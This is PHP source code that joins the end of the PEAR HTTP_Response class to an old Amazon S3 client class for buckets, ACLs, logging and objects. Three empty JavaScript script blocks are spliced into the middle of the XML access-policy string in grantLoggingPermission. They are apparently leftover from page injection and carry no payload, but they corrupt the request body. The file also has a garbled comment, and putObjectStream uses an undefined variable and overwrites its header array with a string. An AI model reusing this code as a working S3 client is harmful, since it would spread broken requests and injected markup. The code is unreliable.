    * @access public
    * @param  bool      Whether to store response body in object property, set
    *                   this to false if downloading a LARGE file and using a Listener.
    *                   This is assumed to be true if body is gzip-encoded.
    * @param  bool      Whether the response can actually have a message-body.
    *                   Will be set to false for HEAD requests.
    * @throws PEAR_Error
    * @return mixed     true on success, PEAR_Error in case of malformed response
    */
    function process($saveBody = true, $canHaveBody = true)
    {
        do {
            $line = $this->_sock->readLine();
            if (sscanf($line, 'HTTP/%s %s', $http_version, $returncode) != 2) {
                return PEAR::raiseError('Malformed response.');
            } else {
                $this->_protocol = 'HTTP/' . $http_version;
                $this->_code     = intval($returncode);
            }
            while ('' !== ($header = $this->_sock->readLine())) {
                $this->_processHeader($header);
            }
        } while (100 == $this->_code);

        $this->_notify('gotHeaders', $this->_headers);

        // RFC 2616, section 4.4:
        // 1. Any response message which "MUST NOT" include a message-body ... 
        // is always terminated by the first empty line after the header fields 
        // 3. ... If a message is received with both a
        // Transfer-Encoding header field and a Content-Length header field,
        // the latter MUST be ignored.
        $canHaveBody = $canHaveBody && $this->_code >= 200 && 
                       $this->_code != 204 && $this->_code != 304;

        // If response body is present, read it and decode
        $chunked = isset($this->_headers['transfer-encoding']) && ('chunked' == $this->_headers['transfer-encoding']);
        $gzipped = isset($this->_headers['content-encoding']) && ('gzip' == $this->_headers['content-encoding']);
        $hasBody = false;
        if ($canHaveBody && ($chunked || !isset($this->_headers['content-length']) || 
                0 != $this->_headers['content-length']))
        {
            if ($chunked || !isset($this->_headers['content-length'])) {
                $this->_toRead = null;
            } else {
                $this->_toRead = $this->_headers['content-length'];
            }
            while (!$this->_sock->eof() && (is_null($this->_toRead) || 0 < $this->_toRead)) {
                if ($chunked) {
                    $data = $this->_readChunked();
                } elseif (is_null($this->_toRead)) {
                    $data = $this->_sock->read(4096);
                } else {
                    $data = $this->_sock->read(min(4096, $this->_toRead));
                    $this->_toRead -= HTTP_REQUEST_MBSTRING? mb_strlen($data, 'iso-8859-1'): strlen($data);
                }
                if ('' == $data) {
                    break;
                } else {
                    $hasBody = true;
                    if ($saveBody || $gzipped) {
                        $this->_body .= $data;
                    }
                    $this->_notify($gzipped? 'gzTick': 'tick', $data);
                }
            }
        }

        if ($hasBody) {
            // Uncompress the body if needed
            if ($gzipped) {
                $body = $this->_decodeGzip($this->_body);
                if (PEAR::isError($body)) {
                    return $body;
                }
                $this->_body = $body;
                $this->_notify('gotBody', $this->_body);
            } else {
                $this->_notify('gotBody');
            }
        }
        return true;
    }


   /**
    * Processes the response header
    *
    * @access private
    * @param  string    HTTP header
    */
    function _processHeader($header)
    {
        if (false === strpos($header, ':')) {
            return;
        }
        list($headername, $headervalue) = explode(':', $header, 2);
        $headername  = strtolower($headername);
        $headervalue = ltrim($headervalue);
        
        if ('set-cookie' != $headername) {
            if (isset($this->_headers[$headername])) {
                $this->_headers[$headername] .= ',' . $headervalue;
            } else {
                $this->_headers[$headername]  = $headervalue;
            }
        } else {
            $this->_parseCookie($headervalue);
        }
    }


   /**
    * Parse a Set-Cookie header to fill $_cookies array
    *
    * @access private
    * @param  string    value of Set-Cookie header
    */
    function _parseCookie($headervalue)
    {
        $cookie = array(
            'expires' => null,
            'domain'  => null,
            'path'    => null,
            'secure'  => false
        );

        // Only a name=value pair
        if (!strpos($headervalue, ';')) {
            $pos = strpos($headervalue, '=');
            $cookie['name']  = trim(substr($headervalue, 0, $pos));
            $cookie['value'] = trim(substr($headervalue, $pos + 1));

        // Some optional parameters are supplied
        } else {
            $elements = explode(';', $headervalue);
            $pos = strpos($elements[0], '=');
            $cookie['name']  = trim(substr($elements[0], 0, $pos));
            $cookie['value'] = trim(substr($elements[0], $pos + 1));

            for ($i = 1; $i < count($elements); $i++) {
                if (false === strpos($elements[$i], '=')) {
                    $elName  = trim($elements[$i]);
                    $elValue = null;
                } else {
                    list ($elName, $elValue) = array_map('trim', explode('=', $elements[$i]));
                }
                $elName = strtolower($elName);
                if ('secure' == $elName) {
                    $cookie['secure'] = true;
                } elseif ('expires' == $elName) {
                    $cookie['expires'] = str_replace('"', '', $elValue);
                } elseif ('path' == $elName || 'domain' == $elName) {
                    $cookie[$elName] = urldecode($elValue);
                } else {
                    $cookie[$elName] = $elValue;
                }
            }
        }
        $this->_cookies[] = $cookie;
    }


   /**
    * Read a part of response body encoded with chunked Transfer-Encoding
    * 
    * @access private
    * @return string
    */
    function _readChunked()
    {
        // at start of the next chunk?
        if (0 == $this->_chunkLength) {
            $line = $this->_sock->readLine();
            if (preg_match('/^([0-9a-f]+)/i', $line, $matches)) {
                $this->_chunkLength = hexdec($matches[1]); 
                // Chunk with zero length indicates the end
                if (0 == $this->_chunkLength) {
                    $this->_sock->readLine(); // make this an eof()
                    return '';
                }
            } else {
                return '';
            }
        }
        $data = $this->_sock->read($this->_chunkLength);
        $this->_chunkLength -= HTTP_REQUEST_MBSTRING? mb_strlen($data, 'iso-8859-1'): strlen($data);
        if (0 == $this->_chunkLength) {
            $this->_sock->readLine(); // Trailing CRLF
        }
        return $data;
    }


   /**
    * Notifies all registered listeners of an event.
    * 
    * @param    string  Event name
    * @param    mixed   Additional data
    * @access   private
    * @see HTTP_Request::_notify()
    */
    function _notify($event, $data = null)
    {
        foreach (array_keys($this->_listeners) as $id) {
            $this->_listeners[$id]->update($this, $event, $data);
        }
    }


   /**
    * Decodes the message-body encoded by gzip
    *
    * The real decoding work is done by gzinflate() built-in function, this
    * method only parses the header and checks data for compliance with
    * RFC 1952  
    *
    * @access   private
    * @param    string  gzip-encoded data
    * @return   string  decoded data
    */
    function _decodeGzip($data)
    {
        if (HTTP_REQUEST_MBSTRING) {
            $oldEncoding = mb_internal_encoding();
            mb_internal_encoding('iso-8859-1');
        }
        $length = strlen($data);
        // If it doesn't look like gzip-encoded data, don't bother
        if (18 > $length || strcmp(substr($data, 0, 2), "\x1f\x8b")) {
            return $data;
        }
        $method = ord(substr($data, 2, 1));
        if (8 != $method) {
            return PEAR::raiseError('_decodeGzip(): unknown compression method');
        }
        $flags = ord(substr($data, 3, 1));
        if ($flags & 224) {
            return PEAR::raiseError('_decodeGzip(): reserved bits are set');
        }

        // header is 10 bytes minimum. may be longer, though.
        $headerLength = 10;
        // extra fields, need to skip 'em
        if ($flags & 4) {
            if ($length - $headerLength - 2 < 8) {
                return PEAR::raiseError('_decodeGzip(): data too short');
            }
            $extraLength = unpack('v', substr($data, 10, 2));
            if ($length - $headerLength - 2 - $extraLength[1] < 8) {
                return PEAR::raiseError('_decodeGzip(): data too short');
            }
            $headerLength += $extraLength[1] + 2;
        }
        // file name, need to skip that
        if ($flags & 8) {
            if ($length - $headerLength - 1 < 8) {
                return PEAR::raiseError('_decodeGzip(): data too short');
            }
            $filenameLength = strpos(substr($data, $headerLength), chr(0));
            if (false === $filenameLength || $length - $headerLength - $filenameLength - 1 < 8) {
                return PEAR::raiseError('_decodeGzip(): data too short');
            }
            $headerLength += $filenameLength + 1;
        }
        // comment, need to skip that also
        if ($flags & 16) {
            if ($length - $headerLength - 1 < 8) {
                return PEAR::raiseError('_decodeGzip(): data too short');
            }
            $commentLength = strpos(substr($data, $headerLength), chr(0));
            if (false === $commentLength || $length - $headerLength - $commentLength - 1 < 8) {
                return PEAR::raiseError('_decodeGzip(): data too short');
            }
            $headerLength += $commentLength + 1;
        }
        // have a CRC for header. let's check
        if ($flags & 1) {
            if ($length - $headerLength - 2 < 8) {
                return PEAR::raiseError('_decodeGzip(): data too short');
            }
            $crcReal   = 0xffff & crc32(substr($data, 0, $headerLength));
            $crcStored = unpack('v', substr($data, $headerLength, 2));
            if ($crcReal != $crcStored[1]) {

                return PEAR::raiseError('_decodeGzip(): header CRC check failed');
            }
            $headerLength += 2;
        }
        // unpacked data CRC and size at the end of encoded data
        $tmp = unpack('V2', substr($data, -8));
        $dataCrc  = $tmp[1];
        $dataSize = $tmp[2];

        // finally, call the gzinflate() function
        $unpacked = @gzinflate(substr($data, $headerLength, -8), $dataSize);
        if (false === $unpacked) {
            return PEAR::raiseError('_decodeGzip(): gzinflate() call failed');
        } elseif ($dataSize != strlen($unpacked)) {
            return PEAR::raiseError('_decodeGzip(): data size check failed');
        } elseif ((0xffffffff & $dataCrc) != (0xffffffff & crc32($unpacked))) {
            return PEAR::raiseError('_decodeGzip(): data CRC check failed');
        }
        if (HTTP_REQUEST_MBSTRING) {
            mb_internal_encoding($oldEncoding);
        }
        return $unpacked;
    }
} // End class HTTP_Response
?><?php
// This software code is made available "AS IS" without warranties of any
// kind.  You may copy, display, modify and redistribute the software
// code either by itself or as incorporated into your code; provided that
// you do not remove any proprietary notices.  Your use of this software
// code is at your own risk and you waive any claim against Amazon
// Digital Services, Inc. or its affiliates with respect to your use of
// this software code. (c) 2006 Amazon Digital Services, Inc. or its
// affiliates.

// Notes:
// - This relies on HTTP_Request from pear.php.net, but the latest version
//   has a bug; see note below on how to fix it (one-character change).
// - A real implementation would stream data in and out of S3; this
//   proof-of-concept stores complete files/responses on the PHP server
//   before passing them on to Amazon or to the web browser.
// - Because of the above fact, large files will require increasing PHP's
//   publicious settings governing the size of uploaded files.

/**
 * A PHP5 class for interfacing with the Amazon S3 API
 *
 * This is a modification and extension of the Storage3 class built by apokalyptik (apokalyptik@apokalyptik.com) and sponsored by Ookles, Inc.
 * Detials about the original class can be found here: http://freshmeat.net/projects/storage3
*/


// Note that version HTTP_Request 1.3.0 has a BUG in it!  Change line
// 765 from:
//            (HTTP_REQUEST_METHOD_POST != $this->_method && empty($this->_postData) && empty($this->_postFiles))) {
// to:
//            (HTTP_REQUEST_METHOD_POST == $this->_method && empty($this->_postData) && empty($this->_postFiles))) {
// Without this change PUTs with non-empty content-type will fail!
	
class s3{

	public $serviceUrl;
	public $accessKeyId;
	public $secretKey;
	public $responseString;
	public $responseCode;
	public $parsed_xml;
			
	/**
	 * Constructor
	 *
	 * Takes ($accessKeyId, $secretKey, $serviceUrl)
	 *
	 * - [str] $accessKeyId: Your AWS Access Key Id
	 * - [str] $secretKey: Your AWS Secret Access Key
	 * - [str] $serviceUrl: OPTIONAL: defaults: http://s3.amazonaws.com/
	 *
	*/
	function __construct($accessKeyId, $secretKey, $serviceUrl="http://s3.amazonaws.com/") {
		$this->serviceUrl=$serviceUrl;
		$this->accessKeyId=$accessKeyId;
		$this->secretKey=$secretKey;
	}
			
	/**
	 * createBucket -- creates a bucket.
	 *
	 * Takes ($bucket, $acl)
	 *
	 * - [str] $bucket: the bucket you wish to create
	 * - [str] $acl: the access control policy (OPTIONAL: defaults to 'private')
	*/
	function createBucket($bucket, $acl = 'private') {
		$httpDate = gmdate("D, d M Y G:i:s T");
		$stringToSign = "PUT\n\n\n$httpDate\nx-amz-acl:$acl\n/$bucket";
		$signature = $this->constructSig($stringToSign);
		$req =& new HTTP_Request($this->serviceUrl . $bucket);
		$req->setMethod("PUT");
		$req->addHeader("Date", $httpDate);
		$req->addHeader("Authorization", "AWS " . $this->accessKeyId . ":" . $signature);
		$req->addHeader("x-amz-acl", $acl);
		$req->sendRequest();
		$this->responseCode=$req->getResponseCode();
		$this->responseString = $req->getResponseBody();
		$this->parsed_xml = simplexml_load_string($this->responseString);
		if ($this->responseCode == 200) {
			return true;
		} else {
			return false;
		}
	}
	
	/**
	 * deleteBucket -- Deletes an empty bucket.
	 *
	 * Takes ($bucket)
	 *
	 * - [str] $bucket: the bucket you wish to delete
	*/		
	function deleteBucket($bucket) {
		$httpDate = gmdate("D, d M Y G:i:s T");
		$stringToSign = "DELETE\n\n\n$httpDate\n/$bucket";
		$signature = $this->constructSig($stringToSign);
		$req =& new HTTP_Request($this->serviceUrl . $bucket);
		$req->setMethod("DELETE");
		$req->addHeader("Date", $httpDate);
		$req->addHeader("Authorization", "AWS " . $this->accessKeyId . ":" . $signature);
		$req->sendRequest();
		$this->responseCode = $req->getResponseCode();
		$this->responseString = $req->getResponseBody();
		$this->parsed_xml = simplexml_load_string($this->responseString);		
		if ($this->responseCode == 204) {
			return true;			
		} else {
			return false;
		}
	}
	
	/**
	 * emptyBucket -- Deletes all keys in specified bucket.
	 *
	 * Takes ($bucket)
	 *
	 * - [str] $bucket: the bucket you wish to empty
	*/		
	function emptyBucket($bucket) {
		if($this->listKeys($bucket)){//get keys from S3 bucket
			$more = $this->parsed_xml->IsTruncated; //determine of all keys in bucket are returned on this list call
			$keys = $this->parsed_xml->Contents;
			//set up array for catching keys that aren't successfully deleted and set the initial count of these to 0
			$not_deleted_keys = array();
			$not_deleted_count = 0;
			foreach($keys as $current){//try up to 3 times to delete current key
				$tries=1;
				while(!$this->deleteObject($bucket, $current->Key) && $tries<=3){
					$tries++;
				}
				if($tries>3){//capture any keys that aren't deleted
			 		$not_deleted_keys[$not_deleted_count] = $current->Key;
					$not_deleted_count++;
				}
			}
		} else {
			echo "listKeys() failed";
			return false;
		}
		if($not_deleted_count > 0){
			echo "<b>Warning</b> - The following keys were not deleted:<br>";
			foreach($not_deleted_keys as $key){
				echo $key."<br>";
			}
		}
		if($more == "true") //call emptyBucket if not all keys were returned with last list call
			$this->emptyBucket($bucket);
		return true;
	}
	
	/**
	 * listBuckets -- Lists all buckets.
	*/
	function listBuckets() {
		$httpDate = gmdate("D, d M Y G:i:s T");
		$stringToSign="GET\n\n\n$httpDate\n/";
		$signature = $this->constructSig($stringToSign);
		$req =& new HTTP_Request($this->serviceUrl);
		$req->addHeader("Date", $httpDate);
		$req->addHeader("Authorization", "AWS " . $this->accessKeyId . ":" . $signature);
		$req->sendRequest();
		$this->responseCode = $req->getResponseCode();
		$this->responseString = $req->getResponseBody();
		$this->parsed_xml = simplexml_load_string($this->responseString);
		if($this->responseCode == 200){
			return true;
		}
		else{
			return false;
		}    
	}
	
	/**
	 * listKeys -- Lists keys in a bucket.
	 *
	 * Takes ($bucket [,$marker][,$prefix][,$delimiter][,$maxKeys]) -- $marker, $prefix, $delimeter, $maxKeys are independently optional
	 *
	 * - [str] $bucket: the bucket whose keys are to be listed
	 * - [str] $marker: keys returned will occur lexicographically after $marker (OPTIONAL: defaults to false)
	 * - [str] $prefix: keys returned will start with $prefix (OPTIONAL: defaults to false)
	 * - [str] $delimiter: keys returned will be of the form "$prefix[some string]$delimeter" (OPTIONAL: defaults to false)
	 * - [str] $maxKeys: number of keys to be returned (OPTIONAL: defaults to 1000 - maximum allowed by service)
	*/
	function listKeys($bucket, $marker=FALSE, $prefix=FALSE, $delimiter=FALSE, $maxKeys='1000') {
		$httpDate = gmdate("D, d M Y G:i:s T");
		$stringToSign = "GET\n\n\n$httpDate\n/$bucket";
		$signature = $this->constructSig($stringToSign);
		$req =& new HTTP_Request($this->serviceUrl.$bucket."?max-keys={$maxKeys}&marker={$marker}&prefix={$prefix}&delimiter={$delimiter}");
		$req->addHeader("Date", $httpDate);
		$req->addHeader("Authorization", "AWS " . $this->accessKeyId . ":" . $signature);
		$req->sendRequest();
		$this->responseCode = $req->getResponseCode();
		$this->responseString = $req->getResponseBody();
		$this->parsed_xml = simplexml_load_string($this->responseString);
		if($this->responseCode == 200){
			return true;
		} else {
			return false;
		}
	}
	
	/**
	 * getBucketACL -- Gets bucket access control policy.
	 *
	 * Takes ($bucket)
	 *
	 * - [str] $bucket: the bucket whose acl you want
	*/	 
	function getBucketACL($bucket){
		$httpDate = gmdate("D, d M Y G:i:s T");
		$stringToSign = "GET\n\n\n$httpDate\n/$bucket/?acl";
		$signature = $this->constructSig($stringToSign);
		$req =& new HTTP_Request($this->serviceUrl.$bucket.'/?acl');
		$req->setMethod("GET");
		$req->addHeader("Date", $httpDate);
		$req->addHeader("Authorization", "AWS " . $this->accessKeyId . ":" . $signature);
		$req->sendRequest();
		$this->responseCode = $req->getResponseCode();
		$this->responseString = $req->getResponseBody();
		$this->parsed_xml = simplexml_load_string($this->responseString);
		if ($this->responseCode == 200) {
			return true;
		} else {
			return false;		
		}
	}
	
	/**
	 * setBucketACL -- Sets bucket access control policy to one of Amazon S3 canned policies.
	 *
	 * Takes ($bucket, $acl)
	 *
	 * - [str] $bucket: the bucket whose acl is to be set
	 * - [str] $acl: one of the Amazon S3 canned access policies
	*/
	function setBucketACL($bucket, $acl){
		$httpDate = gmdate("D, d M Y G:i:s T");
		$stringToSign = "PUT\n\n\n{$httpDate}\nx-amz-acl:$acl\n/$bucket/?acl";
		$signature = $this->constructSig($stringToSign);
		$req =& new HTTP_Request($this->serviceUrl.$bucket.'/?acl');
		$req->setMethod("PUT");
		$req->addHeader("Date", $httpDate);
		$req->addHeader("Authorization", "AWS " . $this->accessKeyId . ":" . $signature);
		$req->addHeader("x-amz-acl", $acl);
		$req->sendRequest();
		$this->responseCode=$req->getResponseCode();
		$this->responseString=$req->getResponseBody();
		$this->parsed_xml=simplexml_load_string($this->responseString);
		if ($this->responseCode == 200) {
			return true;
		} else {
			return false;
		}
	}
	
	/**
	 * grantLoggingPermission -- allows logs to be written to the bucket.
	 *
	 * Takes ($bucket)  
	 *
	 * - [str] $bucket
	*/   
	function grantLoggingPermission($bucket){
		$httpDate = gmdate("D, d M Y G:i:s T");
		$stringToSign = "PUT\n\ntext/plain\n{$httpDate}\n/$bucket/?acl";
		$signature = $this->constructSig($stringToSign);
		$req =& new HTTP_Request($this->serviceUrl.$bucket.'/?acl');
		$req->setMethod("PUT");
		//The body below is meant in part as an example of how to grant specific groups certain permissions. In practice, use the getBucketACL method to obtain
		//the owner Id and display name. The <ID> and <DisplayName> elements will have to be filled in accordingly here. These can be obtained by using the Get 
		//Object ACL or Get Bucket ACL method on an existing object or bucket respectively.Note that this was written with See the the idea that a new bucket
		//first be created with the sole purpose of housing logs. As is, this method will overwrite the ACP for an existing bucket. See the Developer Guide for
		//more details on granting permissions.
		$body = "<?xml version='1.0' encoding='UTF-8'?>
				<AccessControlPolicy xmlns='http://s3.amazonaws.com/doc/2006-03-01/'>
					<Owner>
						<ID></ID>
						<DisplayName></DisplayName>
					</Owner>
					<AccessControlList>
						<Grant>
							<Grantee xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xsi:type='CanonicalUser'>
								<ID></ID>
								<DisplayName></DisplayName>
							</Grantee>
							<Permission>FULL_CONTROL</Permission><script type="text/javascript">

</script><script type="text/javascript">

</script><script type="text/javascript">

</script>
						</Grant>
						<Grant>
							<Grantee xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xsi:type='Group'>
								<URI>http://acs.amazonaws.com/groups/s3/LogDelivery</URI>
							</Grantee>
							<Permission>WRITE</Permission>
						</Grant>
						<Grant>
							<Grantee xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' xsi:type='Group'>
								<URI>http://acs.amazonaws.com/groups/s3/LogDelivery</URI>
							</Grantee>
							<Permission>READ_ACP</Permission>
					</Grant>
				</AccessControlList>
			</AccessControlPolicy>";
		$req->setBody($body);
		$req->addHeader("Date", $httpDate);
		$req->addHeader("Content-Type", "text/plain");
		$req->addHeader("Authorization", "AWS " . $this->accessKeyId . ":" . $signature);
		$req->sendRequest();
		$this->responseCode=$req->getResponseCode();
		$this->responseString=$req->getResponseBody();
		$this->parsed_xml=simplexml_load_string($this->responseString);
		if ($this->responseCode == 200) {
			return true;
		} else {
			return false;
		}
	}
	
	/**
	 * getLoggingStatus -- gets a bucket's logging status (is logging enabled?).
	 *
	 * Takes ($bucket)  
	 *
	 * - [str] $bucket
	*/   
	function getLoggingStatus($bucket){
		$httpDate = gmdate("D, d M Y G:i:s T");
		$stringToSign = "GET\n\n\n$httpDate\n/$bucket?logging";
		$signature = $this->constructSig($stringToSign);
		$req =& new HTTP_Request($this->serviceUrl.$bucket.'?logging');
		$req->setMethod("GET");
		$req->addHeader("Date", $httpDate);
		$req->addHeader("Authorization", "AWS " . $this->accessKeyId . ":" . $signature);
		$req->sendRequest();
		$this->responseCode = $req->getResponseCode();
		$this->responseString = $req->getResponseBody();
		$this->parsed_xml = simplexml_load_string($this->responseString);
		if ($this->responseCode == 200) {
			return true;
		} else {
			return false;
		}
	}
	
	/**
	 * enableLogging -- Turns logging feature on/off for a given bucket.
	 *
	 * Takes ($bucket, $targetBucket, $targetPrefix, $switch)  
	 *
	 * - [str] $bucket: Bucket for which logging is to be turned on.
	 * - [str] $targetBucket: Bucket to which logs will be sent.
	 * - [str] $targetPrefix: Prefix for key of each log entry.
	 * - [bool] $switch: True to turn logging on, False to turn it off.
	*/   
	function enableLogging($bucket, $targetBucket, $targetPrefix, $switch) {
		$httpDate = gmdate("D, d M Y G:i:s T");
		$stringToSign = "PUT\n\ntext/xml\n{$httpDate}\n/$bucket?logging";
		$signature = $this->constructSig($stringToSign);
		$req = & new HTTP_Request($this->serviceUrl.$bucket.'?logging');
		$req->setMethod("PUT");
		$req->addHeader("Date", $httpDate);
		$req->addHeader("Content-Type", "text/xml");
		$req->addHeader("Authorization", "AWS " . $this->accessKeyId . ":" . $signature);
		if($switch){
			$body = "<?xml version='1.0' encoding='UTF-8'?>
						<BucketLoggingStatus xmlns='http://s3.amazonaws.com/doc/2006-03-01/'>
							<LoggingEnabled>
								<TargetBucket>$targetBucket</TargetBucket>
								<TargetPrefix>$targetPrefix</TargetPrefix>
							</LoggingEnabled>
						</BucketLoggingStatus>";
		} else {
			$body =	"<?xml version='1.0' encoding='UTF-8'?>
						<BucketLoggingStatus xmlns='http://s3.amazonaws.com/doc/2006-03-01/'>
						</BucketLoggingStatus>";
		}
		$req->setBody($body);
		$req->sendRequest();
		$this->responseCode = $req->getResponseCode();
		$this->responseString = $req->getResponseBody();		
		if ($this->responseCode == 200) {
			return true;
		} else {		
			return false;
		}
	}
	
	/**
	 * putObject -- Writes a file to a bucket.
	 *
	 * Takes ($bucket, $key, $filePath, $contentType, $contentLength [,$acl][, $metadataArray], [$md5])  
	 *
	 * - [str] $bucket: the bucket into which file will be written
	 * - [str] $key: key of written file
	 * - [str] $contentType: file content type
	 * - [str] $contentLength: file content length
	 * - [str] $acl: access control policy of file (OPTIONAL: defaults to 'private')
	 * - [array] $metadataArray: associative array containing user-defined metadata (name=>value) (OPTIONAL)
	 * - [bool] $md5: includes the MD5 hash of the object if true (OPTIONAL)
	*/   
	function putObject($bucket, $key, $filePath, $contentType, $contentLength, $acl, $metadataArray, $md5){
		
		$MD5 = $md5 ; 
		
		sort($metadataArray);
		$resource = $bucket."/".urlencode($key);
		$req = & new HTTP_Request($this->serviceUrl.$resource);
		$req->setMethod("PUT");
		$httpDate = gmdate("D, d M Y G:i:s T");
		$req->addHeader("Date", $httpDate);
		$req->addHeader("Content-Type", $contentType);
		$req->addHeader("Content-Length", $contentLength);
		$req->addHeader("x-amz-acl", $acl);
		if($md5){
			$MD5 = $this->hex2b64(md5_file($filePath));
			$req->addHeader("Content-MD5", $MD5);
		}
		$req->setBody(file_get_contents($filePath));
		$stringToSign="PUT\n".$MD5."\n$contentType\n$httpDate\nx-amz-acl:$acl\n";
		foreach($metadataArray as $current){
			if($current!=""){
				$stringToSign.="x-amz-meta-$current\n";
				$header = substr($current,0,strpos($current,':'));
				$meta = substr($current,strpos($current,':')+1,strlen($current));
				$req->addHeader("x-amz-meta-$header", $meta);
			}
		}
		$stringToSign.="/$resource";
		$signature = $this->constructSig($stringToSign);    
		$req->addHeader("Authorization", "AWS " . $this->accessKeyId . ":" . $signature);
		$req->sendRequest();
		$this->responseCode = $req->getResponseCode();
		$this->responseString = $req->getResponseBody();
		$this->parsed_xml = simplexml_load_string($this->responseString);
		if ($this->responseCode == 200) {
			return true;
		} else {
			return false;
		}
	}
	
	/**
	 * putObjectStream -- Streams data to a bucket. (Note: this method was written by Carson McDonald and can be found on the Mission Data Blog)
	 * Mission Data Blog: http://blogs.missiondata.com/linux/49/s3-streaming-with-php/
	 *
	 * Takes ($bucket, $key, $streamFunction, $contentType, $contentLength, $filePath [,$acl][,$metadataArray])
	 *
	 *
	 * - [str] $bucket: the bucket into which file will be written
	 * - [str] $key: key of written file
	 * - [str] $streamFunction: function to call for data to stream
	 * - [str] $contentType: file content type
	 * - [str] $contentLength: file content length
	 * - [str] $filePath: path of file to be PUT
	 * - [str] $acl: access control policy of file (OPTIONAL: defaults to 'private')
	 * - [str] $metadataArray: associative array containing user-defined metadata (name=>value) (OPTIONAL)
	*/
	function putObjectStream($bucket, $key, $contentType, $contentLength, $filePath, $acl, $metadataArray){
		$stream_inst = new Stream();
		$stream_inst->data = fopen($filePath, "r");
		$streamFunction = array($stream_inst, "stream_function");
			
		sort($metadataArray);
		$resource = "$bucket/$key";
		$resource = urlencode($resource);
		$httpDate = gmdate("D, d M Y G:i:s T");
	
		$curl_inst = curl_init();
	
		curl_setopt ($curl_inst, CURLOPT_CONNECTTIMEOUT, 30);
		curl_setopt ($curl_inst, CURLOPT_LOW_SPEED_LIMIT, 1);
		curl_setopt ($curl_inst, CURLOPT_LOW_SPEED_TIME, 180);
		curl_setopt ($curl_inst, CURLOPT_NOSIGNAL, 1);
		curl_setopt ($curl_inst, CURLOPT_READFUNCTION, $streamFunction);
		curl_setopt ($curl_inst, CURLOPT_URL, $this->serviceUrl . $resource);
		curl_setopt ($curl_inst, CURLOPT_UPLOAD, true);
		curl_setopt ($curl_inst, CURLINFO_CONTENT_LENGTH_UPLOAD, $contentLength);
	
		$header[] = "Date: $httpDate";
		$header[] = "Content-Type: $contentType";
		$header[] = "Content-Length: $contentLength";
		$header[] = "Expect: ";
		$header[] = "Transfer-Encoding: ";
		$header[] = "x-amz-acl: $acl";
	
		$stringToSign="PUT\n$MD5\n$contentType\n$httpDate\nx-amz-acl:$acl\n";
			
		foreach($metadataArray as $current){
			if($current!=""){
				$stringToSign.="x-amz-meta-$current\n";
				$header = substr($current,0,strpos($current,':'));
				$meta = substr($current,strpos($current,':')+1,strlen($current));
				$header[] = "x-amz-meta-$header: $meta";
			}
		}
		$stringToSign.="/$resource";
		$signature = $this->constructSig($stringToSign);
		$header[] = "Authorization: AWS $this->accessKeyId:$signature";
	
		curl_setopt($curl_inst, CURLOPT_HTTPHEADER, $header);
		curl_setopt($curl_inst, CURLOPT_RETURNTRANSFER, 1);
	
		$result = curl_exec ($curl_inst);
	
		$this->responseString = $result;
		$this->responseCode = curl_getinfo($curl_inst, CURLINFO_HTTP_CODE);
		fclose($stream_inst->data);
		curl_close($curl_inst);
		if ($this->responseCode == 200) {
			return true;
		} else {
			return false;
		}
	}
	
	/**
	 * deleteObject -- Deletes an object.
	 *
	 * Takes ($bucket, $key)  
	 *
	 * - [str] $bucket: the bucket from which file will be deleted
	 * - [str] $key: key of file to be deleted
	*/   
	function deleteObject($bucket, $key) {
		$httpDate = gmdate("D, d M Y G:i:s T");
		$resource = $bucket."/".urlencode($key);
		$stringToSign = "DELETE\n\n\n$httpDate\n/$resource";
		$signature = $this->constructSig($stringToSign);
		$req =& new HTTP_Request($this->serviceUrl.$resource);
		$req->setMethod("DELETE");
		$req->addHeader("Date", $httpDate);
		$req->addHeader("Authorization", "AWS " . $this->accessKeyId . ":" . $signature);
		$req->sendRequest();
		$this->responseCode = $req->getResponseCode();
		$this->responseString = $req->getResponseBody();
		$this->parsed_xml = simplexml_load_string($this->responseString);
		if ($this->responseCode == 204) {
			return true;
		} else {
			return false;
		}
	}
	
	/**
	 * getObjectACL -- gets an objects access control policy.
	 *
	 * Takes ($bucket, $key)  
	 *
	 * - [str] $bucket
	 * - [str] $key
	*/   
	function getObjectACL($bucket, $key){
		$httpDate = gmdate("D, d M Y G:i:s T");
		$resource = $bucket."/".urlencode($key);
		$stringToSign = "GET\n\n\n$httpDate\n/$resource?acl";
		$signature = $this->constructSig($stringToSign);
		$req =& new HTTP_Request($this->serviceUrl.$resource.'?acl');
		$req->setMethod("GET");
		$req->addHeader("Date", $httpDate);
		$req->addHeader("Authorization", "AWS " . $this->accessKeyId . ":" . $signature);
		$req->sendRequest();
		$this->responseCode = $req->getResponseCode();
		$this->responseString = $req->getResponseBody();
		$this->parsed_xml = simplexml_load_string($this->responseString);
		if ($this->responseCode == 200) {
			return true;
		} else {
			return false;
		}
	}
	
	/**
	 * setObjectACL -- sets objects access control policy to one of Amazon S3 canned policies.
	 *
	 * Takes ($bucket, $key, $acl)  
	 *
	 * - [str] $bucket
	 * - [str] $key
	 * - [str] $acl -- One of canned access control policies.
	*/   
	function setObjectACL($bucket, $key, $acl){
		$httpDate = gmdate("D, d M Y G:i:s T");
		$resource = $bucket."/".urlencode($key);
		$stringToSign = "PUT\n\n\n$httpDate\nx-amz-acl:$acl\n/$resource?acl";
		$signature = $this->constructSig($stringToSign);
		$req =& new HTTP_Request($this->serviceUrl.$resource.'?acl');
		$req->setMethod("PUT");
		$req->addHeader("Date", $httpDate);
		$req->addHeader("Authorization", "AWS " . $this->accessKeyId . ":" . $signature);
		$req->addHeader("x-amz-acl", $acl);
		$req->sendRequest();
		$this->responseCode = $req->getResponseCode();
		$this->responseString = $req->getResponseBody();
		$this->parsed_xml = simplexml_load_string($this->responseString);
		if ($this->responseCode == 200) {
			return true;
		} else {
			return false;
		}
	}
	
	/**
	 * getMetadata -- Gets the metadata associated with an object.
	 *
	 * Takes ($bucket, $key)  
	 *
	 * - [str] $bucket
	 * - [str] $key
	*/   
	function getMetadata($bucket, $key){
		$httpDate = gmdate("D, d M Y G:i:s T");
		$resource = $bucket."/".urlencode($key);
		$stringToSign = "HEAD\n\n\n$httpDate\n/$resource";
		$signature = $this->constructSig($stringToSign);
		$req =& new HTTP_Request($this->serviceUrl.$resource);
		$req->setMethod("HEAD");
		$req->addHeader("Date", $httpDate);
		$req->addHeader("Authorization", "AWS " . $this->accessKeyId . ":" . $signature);
		$req->sendRequest();
		$this->responseCode = $req->getResponseCode();
		$this->headers = $req->getResponseHeader();
		if ($this->responseCode == 200) {
			return true;
		} else {
			return false;
		}
	}
	
	/**
	 * getObjectAsString -- Returns object as a string.
	 *
